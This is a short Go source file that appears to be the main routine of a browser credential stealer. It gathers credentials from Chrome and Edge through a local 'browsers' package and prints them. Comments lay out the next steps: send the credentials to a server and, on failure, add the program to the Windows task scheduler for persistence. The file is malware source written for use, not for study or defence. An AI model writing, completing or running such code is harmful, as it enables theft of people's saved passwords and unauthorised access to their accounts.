package main

import (
	"fmt"
	"smile/browsers"
)

func main() {

	Data := []browsers.BrowserConfig{}

	// Retrieve credentials from browsers
	Data = append(Data, browsers.Chrome())
	// Data = append(Data, browsers.Firefox());
	Data = append(Data, browsers.Edge())
	// Data = append(Data, browsers.Opera());
	// Data = append(Data, browsers.Safari());

	fmt.Println(Data)

	// send credentials to server

	// if status 200 { return } else { add the program to task sceduler }

}
